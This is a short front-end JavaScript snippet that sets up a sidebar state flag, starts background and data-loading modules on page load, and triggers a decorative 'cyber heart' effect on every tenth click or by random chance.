window.updateSidebarState = (isOpen) => {
    state.sidebarState = isOpen;
};

document.addEventListener('DOMContentLoaded', () => {
    state.isSmallScreen = window.innerWidth <= 768;
    
    if (!state.isSmallScreen) {
        BackgroundSystem.init();
    }
    
    setTimeout(() => {
        DataLoader.init();
    }, 100);

    let clickCount = 0;
    const threshold = 10;
    
    document.addEventListener('click', (e) => {
        clickCount++;
        
        if (clickCount % threshold === 0 || Math.random() < 0.05) {
            DataLoader.createCyberHeart();
        }
    });
});
